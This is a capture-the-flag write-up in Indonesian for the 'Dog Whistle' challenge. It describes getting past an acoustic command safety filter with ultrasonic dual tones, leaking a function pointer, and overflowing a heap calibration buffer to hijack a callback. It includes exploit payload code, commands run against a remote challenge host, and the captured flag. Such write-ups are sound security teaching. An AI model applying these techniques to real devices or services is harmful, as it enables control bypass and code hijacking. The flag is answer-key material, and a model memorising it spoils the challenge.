# Dog Whistle

## Ringkasan

Service menerima satu WAV base64 per baris. Format yang diminta: mono, PCM 24-bit, 96000 Hz, durasi maksimal 2 detik. Di dalam WAV ada modem MFSK 16-tone. Tiap nibble dikirim sebagai tone:

```
tone(k) = 800 + 80*k Hz
```

Frame kontrolnya:

```
A5 5A LEN <payload> CKSUM
```

Payload berisi TLV. Opcode penting:

```
0x01 SELECT_PROFILE
0x02 SET_CAL_VECTOR
0x10 DEBUG_PING
```

Opcode engineering `SELECT_PROFILE` dan `SET_CAL_VECTOR` diblokir oleh safety scan kalau dikirim sebagai tone audible biasa. Bypass-nya memakai ultrasonic dual-tone. Safety scan berjalan sebelum model transducer nonlinear, sedangkan decoder utama berjalan setelahnya. Jadi audio tidak berisi tone 800-2000 Hz secara langsung, tapi setelah nonlinear muncul produk selisih frekuensi:

```
(carrier + tone) - carrier = tone
```

Dengan carrier 20000 Hz, setiap symbol dikirim sebagai dua tone ultrasonic:

```
20000 Hz dan 20000 + target_tone Hz
```

Safety scan tidak melihat frame engineering, tapi decoder utama tetap mendapat frame MFSK valid.

## File Challenge

```
aria                 ELF 64-bit PIE stripped
SPEC.md             spesifikasi protokol acoustic control
actual eq.cfg        profil EQ, default flat
reference_ping.wav  contoh capture ping
```

`strings` di binary menunjukkan string yang relevan:

```
SAFETY LOCKOUT: engineering tone signature present in control band
PROFILE SELECTED: region 0x%02x
CAL ECHO:
FACTORY DIAG UNLOCKED
FLAG: %s
CAL VECTOR WRITTEN: count=%d
PONG
```

## Analisis Awal

Ping audible biasa langsung bisa diproses:

```
PONG
```

Tapi `SELECT_PROFILE` audible dikarantina:

```
SAFETY LOCKOUT: engineering tone signature present in control band
capture quarantined
```

Saat frame yang sama dikirim memakai ultrasonic dual-tone, safety scan tidak lockout dan command engineering jalan:

```
PROFILE SELECTED: region 0x0e
CAL ECHO: ...
```

Ini membuktikan guard hanya memeriksa sinyal sebelum nonlinear stage, sedangkan command sesungguhnya bisa dibuat muncul setelah nonlinear stage.

## Analisis Static / Dynamic

Binary menginisialisasi dua heap object:

```
malloc(0x20) -> calibration vector
malloc(0x30) -> object yang punya function pointer
```

Isi awal calibration vector kira-kira:

```
cal[0:8]  = pointer fungsi FACTORY DIAG UNLOCKED
cal[8:16] = pointer heap object
```

Saat `SELECT_PROFILE 0x0e`, firmware mencetak 16 byte pertama calibration vector sebagai `CAL ECHO`. Ini menjadi leak PIE karena 8 byte pertama adalah pointer fungsi `FACTORY DIAG UNLOCKED`.

Handler `SET_CAL_VECTOR` bermasalah. Format value-nya:

```
count || count buah int16
```

Firmware menjalankan:

```
memcpy(calibration_vector, value + 1, count * 2);
```

Tanpa membatasi ukuran ke 0x20 byte. Karena heap object dialokasikan setelah calibration vector, copy panjang bisa overflow ke object berikutnya.

Offset dari awal calibration vector ke field function pointer object adalah `0x30`:

```
0x00..0x1f  calibration data
0x20..0x2f  chunk header heap berikutnya
0x30..      data object berikutnya
```

Jadi payload exploit menulis pointer fungsi `FACTORY DIAG UNLOCKED` ke offset `0x30`.

Setelah setiap capture, firmware menjalankan callback dari object tersebut. Kalau function pointer sudah dioverwrite ke fungsi factory diag, output-nya:

```
FACTORY DIAG UNLOCKED
FLAG: <flag>
```

## Algoritma Exploit

1. Buat WAV ultrasonic dual-tone untuk `SELECT_PROFILE 0x0e`.
2. Kirim capture pertama.
3. Parse `CAL ECHO`.
4. Ambil 8 byte pertama sebagai alamat fungsi `FACTORY DIAG UNLOCKED`.
5. Buat `SET_CAL_VECTOR` dengan data sepanjang 56 byte:
   - padding sampai offset `0x30`
   - pointer fungsi hasil leak di offset `0x30`
6. Encode lagi sebagai WAV ultrasonic dual-tone.
7. Kirim capture kedua.
8. Callback object lompat ke fungsi factory diag dan mencetak flag.

## Penyusunan Solve Script

`solve.py` hanya memakai Python standard library. Bagian pentingnya:

```
v = amp * (
    sin(2*pi*carrier*t) +
    sin(2*pi*(carrier + tone)*t)
)
```

Tone target tetap `800 + 80*nibble`, tapi tidak dikirim langsung. Yang dikirim adalah pasangan ultrasonic. Nonlinear transducer membuat difference tone di jalur decode utama.

Payload overwrite:

```python
data = bytearray(b"A" * (0x30 + 8))
data[0x20:0x28] = (0).to_bytes(8, "little")
data[0x28:0x30] = (0x41).to_bytes(8, "little")
data[0x30:0x38] = leaked_diag_func.to_bytes(8, "little")
count = len(data) // 2
```

## Cara Menjalankan

Test lokal dengan dummy flag:

```
cd dogwhistle_work
FLAG='H7CTF{dummy_local_flag}' python3 solve.py --local ./aria
```

Output lokal:

```
PROFILE SELECTED: region 0x0e
CAL ECHO: ...
[+] leaked FACTORY DIAG function pointer: ...
CAL VECTOR WRITTEN: count=28
FACTORY DIAG UNLOCKED
FLAG: H7CTF{dummy_local_flag}
<FLAG>H7CTF{dummy_local_flag}</FLAG>
```

Jalankan ke remote:

```
python3 solve.py --remote pwn.h7tex.com 43549
```

Catatan runtime: capture kedua berisi WAV base64 besar, jadi transport remote harus memakai `socket.sendall()`. Versi solver yang memakai `makefile(...).write()` bisa timeout setelah leak karena remote belum menerima seluruh baris capture.

## Flag

Solver dijalankan ke service remote:

```
python3 solve.py --remote pwn.h7tex.com 43549
```

Output remote menghasilkan flag valid:

```
<FLAG>H7CTF{b481d642-49ea-4ae4-aae5-8960daab25e8}</FLAG>
```

Flag akhir:

```
H7CTF{b481d642-49ea-4ae4-aae5-8960daab25e8}
```
